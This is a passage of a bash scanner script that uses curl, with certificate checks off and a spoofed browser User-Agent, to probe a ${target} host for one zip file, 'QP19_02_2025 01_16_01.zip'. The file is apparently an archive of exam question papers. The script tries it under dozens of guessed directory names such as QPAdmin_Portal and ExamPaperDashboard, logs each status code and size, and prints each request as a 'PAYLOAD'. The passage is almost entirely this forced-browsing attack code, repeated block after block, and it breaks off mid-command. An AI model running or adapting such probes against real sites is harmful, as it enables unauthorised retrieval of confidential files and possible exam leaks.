${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPB_Suite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPProcessing-Automation/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPProcessing-Automation/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPProcessing-Automation/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [FileProcessor-QPBData/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}FileProcessor-QPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}FileProcessor-QPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPProcessing_DataSync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPProcessing_DataSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPProcessing_DataSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPService_ProcessingSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPService_ProcessingSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPService_ProcessingSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAdmin_Portal/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAdmin_Portal/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAdmin_Portal/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [TestPaper-DataUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}TestPaper-DataUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}TestPaper-DataUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Suite-ExamPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Suite-ExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Suite-ExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Platform_QPaperDoc/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Platform_QPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Platform_QPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Processing-QPBulk/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Processing-QPBulk/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Processing-QPBulk/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPHandler-Processing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPHandler-Processing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPHandler-Processing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Automation_QPBatch/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Automation_QPBatch/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Automation_QPBatch/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAdmin_AutomationSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAdmin_AutomationSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAdmin_AutomationSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataOpsQPControl/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataOpsQPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataOpsQPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMonitor-FileProcessor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMonitor-FileProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMonitor-FileProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [UploadService_QPB/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}UploadService_QPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}UploadService_QPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaperMgmt/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaperMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaperMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Q_P_Service/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Q_P_Service/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Q_P_Service/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AutomationQPHandler/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AutomationQPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AutomationQPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataOpsQPDatabase/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataOpsQPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataOpsQPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMgmt-Service/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMgmt-Service/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMgmt-Service/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMgmtDatabaseManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMgmtDatabaseManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMgmtDatabaseManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBulk_BatchUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBulk_BatchUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBulk_BatchUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPCloud_Service/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPCloud_Service/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPCloud_Service/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [HandlerQPBData/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}HandlerQPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}HandlerQPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPHandlerTool/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPHandlerTool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPHandlerTool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Manager_QsnPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Manager_QsnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Manager_QsnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaperDoc-System/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaperDoc-System/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaperDoc-System/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [HandlingModule-QPMgmt/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}HandlingModule-QPMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}HandlingModule-QPMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaperDoc-Manager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaperDoc-Manager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaperDoc-Manager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AutomationSystemQPCloud/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AutomationSystemQPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AutomationSystemQPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ExamPaperDashboard/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ExamPaperDashboard/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ExamPaperDashboard/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMonitor-CloudSync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMonitor-CloudSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMonitor-CloudSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ProcessingSuiteQPHandler/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ProcessingSuiteQPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ProcessingSuiteQPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataPipeline-QPB/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataPipeline-QPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataPipeline-QPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMgmtFileUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMgmtFileUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMgmtFileUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AutomationSystem_QPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AutomationSystem_QPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AutomationSystem_QPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [FileProcessorQPProcessing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}FileProcessorQPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}FileProcessorQPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPService-Manager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPService-Manager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPService-Manager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QstnPaper-Dashboard/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
